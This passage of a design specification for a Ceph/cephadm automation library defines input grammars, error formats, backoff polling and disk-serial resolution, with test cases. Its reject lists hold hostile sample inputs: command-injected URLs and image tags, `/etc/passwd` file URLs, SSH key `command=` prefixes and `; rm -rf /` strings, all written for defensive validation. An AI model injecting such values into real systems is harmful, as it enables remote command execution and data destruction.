  `` http://x/f `id` ``, `http://x/f|sh`, `file:///etc/passwd`, `ftp://x/f`,
  `//evil.example.com/x`, `x.example.com/cephadm`, empty, a valid URL followed
  by a newline and a command, `data:text/plain;base64,AAAA`, `https://`,
  `not a url at all`, `https://x/f?a=1&b=2`.
- Also single-quoted at assembly: a second, independent layer at the most
  privileged sink.

### V9. SSH public key line

Appended to `authorized_keys` by `cephDistributeKey`.

- Risk class is persistence, not only injection: an `authorized_keys` line may
  begin with options (`command=`, `from=`, `environment=`, `permitopen=`,
  `no-*` flags) that change what runs on every future login.
- Accepted language: exactly `<keytype> <blob>` or
  `<keytype> <blob> <comment>`, separated by single spaces; whole value 1–8192
  characters; no CR or LF anywhere (checked on the raw value).
  - keytype is one of `ssh-ed25519`, `sk-ssh-ed25519@openssh.com`,
    `ecdsa-sha2-nistp256`, `ecdsa-sha2-nistp384`, `ecdsa-sha2-nistp521`,
    `sk-ecdsa-sha2-nistp256@openssh.com`, `ssh-rsa`, `ssh-dss`;
  - blob is at least 20 base64 characters (letters, digits, `+`, `/`) with up
    to two `=` of padding;
  - comment is one non-whitespace token (e.g. cephadm's `ceph-<fsid>`).
- Accept: `ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIExampleExampleExample`,
  the same plus ` ceph-3f2a9c1e-5b7d-4e8f-9a0b-1c2d3e4f5a6b`.
- Reject: each of the five option prefixes before a valid key; a valid key, a
  newline and a second key; empty; whitespace only; a bare comment; an unknown
  keytype; a blob split by whitespace; a multi-word comment; the battery.
- The error message truncates the value for readability (public keys are not
  secret).

### V10. Cluster fsid

Selects which cluster a destructive purge destroys.

- RFC 4122 textual UUID: hexadecimal groups of 8-4-4-4-12 separated by hyphens,
  hex case-insensitive. Nothing else.
- Accept: `3f2a9c1e-5b7d-4e8f-9a0b-1c2d3e4f5a6b`,
  `3F2A9C1E-5B7D-4E8F-9A0B-1C2D3E4F5A6B`.
- Reject: the same without hyphens, wrapped in braces, with an 11-digit last
  group, with a trailing newline, `*`, empty, the battery.

### V11. Connection fields

- `sshUser` (D1): POSIX portable username. Starts with a letter or underscore,
  then letters, digits, `_`, `-` or `.`; at most 32 characters.
  - Accept: `admin`, `_ceph`, `ceph-admin`, `deploy.user`, 32 characters.
  - Reject: empty, `1admin`, `-admin`, `.admin`, `ad min`, `admin@node1`,
    `admin$`, 33 characters, the battery.
- `keyPath` (D2): absolute local path (begins with `/`), with no control
  characters (no byte below 0x20 and no 0x7F). It is only ever passed as a
  single argv element, never through a shell.
  - Accept: `/home/admin/.ssh/id_ed25519`, `/run/secrets/ceph key`.
  - Reject: `id_ed25519`, `./key`, `~/.ssh/id_ed25519`, a path containing a
    newline or a tab.
  - The shared battery does not apply: shell metacharacters are inert in an
    argv element.
- `strictHostKeyChecking`: exactly `yes` or `no`.
- `port`: integer 1–65535.

### V12. Host target

Used by every `host`, `adminHost` and `hosts[]` field.

- A V5 hostname or a V7 IPv4 address.
- A value whose labels are all decimal digits is judged by V7 alone, so
  `203.0.113.256` is rejected rather than accepted as a hostname.
- A value containing a colon gets the V7 IPv6 message (D9).
- Accept: `node1`, `node1.example.com`, `198.51.100.22`.
- Reject: `203.0.113.256`, `203.0.113`, `node1:22`, `admin@node1`, `-node1`,
  empty, the battery.

### V13. IPv4 CIDR

Used for `clusterNet` (D24) and any other network argument.

- A V7 address, `/`, then a prefix length 0–32 in decimal with no leading
  zeros.
- Accept: `198.51.100.0/24`, `203.0.113.0/28`, `192.0.2.0/32`.
- Reject: `198.51.100.0`, `198.51.100.0/33`, `198.51.100.0/024`, `/24`,
  `198.51.100.0/`, `2001:db8::/32` (IPv6 message, D9), the battery.

### V14. Debian package name

Used by host preparation (D15).

- Debian Policy package name: lowercase ASCII letters, digits, `+`, `-` and
  `.`; at least 2 characters; first character a letter or digit. No
  architecture qualifier and no version pin.
- The value MUST still be single-quoted at assembly (D15).
- Accept: `podman`, `chrony`, `lvm2`, `libstdc++6`, `python3.11`.
- Reject: `p`, `Podman`, `-podman`, `.podman`, `podman=1.0`, `podman:amd64`,
  `podman*`, empty, the battery.

### V15. Container image reference

Used for `cephImage` (D24).

- The OCI distribution reference grammar,
  `[registry[:port]/]path[:tag][@digest]`:
  - registry: a V5-style hostname, optionally `:` and a port;
  - path: one or more components joined by `/`; each component lowercase
    letters and digits, internally separated by a single `.`, one or two `_`,
    or one or more `-`;
  - tag: 1–128 characters of letters, digits, `_`, `.`, `-`, not starting with
    `.` or `-`;
  - digest: `sha256:` and exactly 64 lowercase hex characters;
  - at least one of tag or digest MUST be present, so the cluster version is
    always pinned;
  - whole value at most 255 characters.
- The value MUST also be single-quoted at assembly.
- Accept: `quay.io/ceph/ceph:v19.2.3`,
  `registry.example.com:5000/ceph/ceph:v19.2.3`,
  `quay.io/ceph/ceph@sha256:` followed by 64 hex characters.
- Reject: `quay.io/ceph/ceph` (unpinned), `quay.io/Ceph/ceph:v19`,
  `quay.io/ceph/ceph:`, `quay.io/ceph/ceph:-v19`, `quay.io//ceph:v19`,
  `quay.io/ceph/ceph:v19 ; id`, empty, the battery.

---

## 13. Error taxonomy and phase-attributed errors

- **Purpose:** every failure reaches the workflow in one voice that names the
  phase, what was expected and what was observed.

### 13.1 Phase-attributed error format

- `cephadm[<phase>]: <message>`, then, if any detail fields are defined, a
  space and a parenthesised, comma-separated `key=value` list in insertion
  order.
- String values render raw. Numbers, booleans, arrays and objects render as
  JSON. Undefined values are omitted. No parentheses when nothing remains.
- The helper always throws an `Error`; it never returns.
- **Phase names:**
  - `<methodName>:<step>`, e.g. `wipeDiskToRaw:gate-resolve`,
    `cephApplyOsd:gate-resolve`;
  - `validate` for runtime grammar re-validation (§12);
  - a step name ending `-outcome-unknown` for a write lost after the session
    may have started (§10.5).
- **Security:** detail fields MUST NOT carry a secret; messages may be logged
  or shown.

### 13.2 Error classes a caller can see

| # | Class | When |
|---|---|---|
| 1 | Schema rejection | arguments fail the schema, before the method runs |
| 2 | Phase-attributed method error | any method-level failure, including `validate` |
| 3 | Typed transport error | ssh exit 255, connection failure, or our timeout; kind and pre-session cause (§10, D8) |
| 4 | Sudo policy error | sudo needs a password (§6) |
| 5 | Remote-exit error | the remote command exited non-zero and that was not allowed (§2) |
| 6 | Local refusal | both identities set; NUL byte; insecure control-socket directory; temporary identity directory not removable |

Classes 3, 4 and 6 are thrown regardless of the allow-non-zero option.

### 13.3 Test obligations

- [ ] Phase `bootstrap`, message `fsid missing`, no detail → exactly
      `cephadm[bootstrap]: fsid missing`.
- [ ] Detail `{host: "node1.example.com", expected: 6, observed: 5, up: true}`
      → suffix ` (host=node1.example.com, expected=6, observed=5, up=true)`.
- [ ] Detail with an undefined field → that key omitted; all undefined → no
      parentheses.
- [ ] Always an `Error` instance.
- [ ] Typed transport error is distinguishable by type, not by message text
      (D8).

---

## 14. Capped exponential backoff and polling

- **Purpose:** the one wait shape for every poll and retry loop. The caller's
  interval argument is the **ceiling** (the longest gap between reads), not a
  fixed beat.

### 14.1 Behaviour

- For zero-based sleep index n (0 = the sleep after the first read) and ceiling
  C:
  - base = max(1, ceil(C / 16));
  - raw = max(1, min(C, base × 2ⁿ));
  - sleep = raw/2 + r × raw/2, rounded, with r from the injected random
    generator in [0, 1); never below 1 ms.

  The ladder starts near C/16 and doubles up to C.
- Consumers MUST:
  - clamp each sleep to the time left before the deadline, never sleeping past
    it;
  - retry only transport errors during a poll; an evaluator refusal stops the
    loop at once (D47);
  - after the deadline, do one final read, in case the deadline raced a slow
    read;
  - bound any loop driven by the injectable clock by an iteration count as
    well, so a frozen fake clock cannot spin forever;
  - report the real number of poll attempts where the record has such a field
    (D45).
- No fixed settle windows. Why: a fixed sleep is either too short on a slow
  cluster or wasted time on a fast one; a capped ladder serves both.
- Why 1 ms minimum: a fake clock always advances and a real one never
  busy-spins. Why an injected random generator: tests pin r=0 or r→1.

### 14.2 Test obligations

- [ ] r=0 → raw/2 (rounded, at least 1).
- [ ] r→1 → approximately raw.
- [ ] Large n → saturates at C.
- [ ] C=1 → at least 1.
- [ ] Deadline 50 ms away, computed sleep 400 ms → sleeps at most 50 ms, then
      one final read.
- [ ] Frozen clock → loop ends at its iteration bound.
- [ ] Transport error mid-poll → retried; evaluator refusal → no further reads
      (D47).

---

## 15. Serial → stable device path resolution

- **Safety class:** read-only. It gates destructive and consuming callers
  (`wipeDiskToRaw`, `cephApplyOsd` by-serial mode, `cephVerifyDisksRaw`).
- **Purpose:** answer "does this serial name exactly one real block device?"
  with one shared implementation, so the destructive and the consuming paths
  never drift apart, and return a path that is stable across reboots.

### 15.1 Inputs

| Name | Meaning |
|---|---|
| target | the SSH connection (§1) |
| serial | the disk serial; re-validated here (D3) |
| phase | the caller's phase label; every failure is attributed to it |

### 15.2 Character sets (D6)

Stated separately and tested independently:

- **By-id link name** (the final path component under `/dev/disk/by-id/`):
  ASCII letters, digits, dot, underscore, colon, hyphen.
- **Resolved device path:** an absolute path starting `/dev/`, made only of
  ASCII letters, digits, dot, underscore, hyphen and slash.

### 15.3 Behaviour

1. Re-validate the serial with V4 using the runtime form (phase `validate`). The
   resolver MUST NOT rely on the caller having done it (D3).
2. Over SSH, without sudo (by-id links are world-readable), list the names of
   the entries in `/dev/disk/by-id/`, printing only entries whose target
   exists (dangling links dropped). A non-zero exit is tolerated. The serial
   MUST NOT appear in this command unquoted, and MUST NOT be part of a remote
   glob (D3); the matching SHOULD happen on the control host.
3. Keep only names that satisfy the by-id link-name set (§15.2). Anything else
   is dropped silently as not a candidate and is never interpolated.
4. Drop partition links (names ending `-part` followed by digits).
5. A name matches only when it **ends with** `_<serial>` or `-<serial>` (D4).
   A serial appearing anywhere else in a name is not a match (D4).
6. Zero matches → fail "serial resolved to zero devices".
7. Run `readlink -f` on the explicit, single-quoted full link paths of every
   match (never a glob), piped through `sort -u`.
8. Zero results → the zero-devices failure. More than one distinct result →
   fail "ambiguous", listing the devices (D4, D5).
9. Check the single resolved device against the resolved-device-path set
   (§15.2); otherwise fail "not a plausible device path".
   - Why: that value never passed any schema and is about to reach root
     sinks such as `mdadm --zero-superblock` and `wipefs -a`.
10. Return the **by-id link path** `/dev/disk/by-id/<name>` (D5). When several
    links match and all resolve to the same device, return the
    lexicographically smallest matching name, so the answer is deterministic.
    The resolved device MAY also be returned for reporting, but kernel device
    names MUST NOT appear in OSD specs (D5).
    - Why: kernel names such as `/dev/sdb` reorder across reboots; by-id names
      do not.

### 15.4 Idempotency

A pure read; the same answer on every rerun while the hardware is unchanged.

### 15.5 Output

`{ path, device }`: `path` is the by-id link path (always used by callers for
OSD specs); `device` is the resolved kernel device (reporting only).

### 15.6 Failure modes

All are phase-attributed errors under the **caller's** phase, with `host` and
`serial` in the detail, plus `devices` (ambiguous) or `device` (implausible).
Transport errors propagate unchanged (§10). An invalid serial fails in phase
`validate`.

### 15.7 Security

- The serial is validated here, matched on the control host, and never placed
  in a remote glob (D3).
- Every link path and device path is single-quoted wherever it is placed in a
  command, because link names may contain dots and colons.

### 15.8 Why

- After a disk's partition table is wiped, udev can still list `-partN` links;
  counting them makes one disk look ambiguous and blocks both wipe and OSD
  claim.
- Several links (for example `ata-<model>_<serial>` and
  `scsi-SATA_<model>_<serial>`) commonly name one disk; deduplicating after
  resolution keeps them from looking ambiguous.
- Matching on the name suffix stops a serial that is a prefix or infix of
  another disk's serial from matching that disk (D4).
- Putting the resolved-path check in the shared resolver gives every caller the
  same guard.

### 15.9 Test obligations

- [ ] One link `nvme-EXAMPLE_MODEL_SN000000000A` → `/dev/nvme0n1` → returns
      path `/dev/disk/by-id/nvme-EXAMPLE_MODEL_SN000000000A`, device
      `/dev/nvme0n1` (D5).
- [ ] Exactly two SSH calls: the first lists by-id entries, is not under sudo,
      and does not contain the serial unquoted or in a glob (D3); the second
      starts `readlink -f`, contains the single-quoted link path, contains
      `sort -u`, and contains no `*`.
- [ ] Serial failing V4 (e.g. `SN*`, `SN; id`) → `validate` error, zero SSH
      calls (D3).
- [ ] No links → `cephadm[<phase>]: serial resolved to zero devices ...`.
- [ ] Two matching links resolving to two devices → ambiguous error under the
      caller's phase (D4).
- [ ] Disk link plus `-part1` and `-part2` links → resolves to the disk;
      `readlink` never sees a partition link.
- [ ] Two matching links (`ata-...` and `scsi-...`) resolving to one device →
      returns the lexicographically smallest by-id path (D5).
- [ ] Serial `SN0001` with links ending `_SN0001` and `_SN00012` → only the
      first matches (D4).
- [ ] Serial appearing mid-name only (e.g. `nvme-X_SN0001_1`) → not a match
      (D4).
- [ ] By-id names with a colon are kept; names with a space, `$` or `;` are
      dropped (D6).
- [ ] Resolved output `; rm -rf /`, `&& evil`, a path with a colon, or one not
      starting `/dev/` → "not a plausible device path" (D6).
- [ ] Resolved devices accepted unchanged: `/dev/nvme0n1`, `/dev/sda`,
      `/dev/md0`, `/dev/dm-0` (D6).
- [ ] Distinct caller phases (`wipeDiskToRaw:gate-resolve`,
      `cephApplyOsd:gate-resolve`) appear in their errors for both zero-match
      and implausible-path failures.

---

## Unresolved

- **By-id choice when several links match one device (D5).** This file picks
  the lexicographically smallest name. The reviewer should confirm, or prefer a
  type order (for example `wwn-` first), after the D5 twin check.
- **NVMe namespace alias.** Under D4 suffix matching, a link of the form
  `nvme-<model>_<serial>_1` no longer matches. If some NVMe disks expose
  **only** the `_1` form, they become unresolvable. Confirm on the twin with
  D4.
- **New grammars V12–V15.** The host-target disambiguation (V12), the CIDR
  form (V13, including whether host bits must be zero), the Debian
  package-name form (V14, no version pins) and the image reference form (V15,
  tag or digest required) are derived here from public standards to serve D15
  and D24. The reviewer should confirm them.
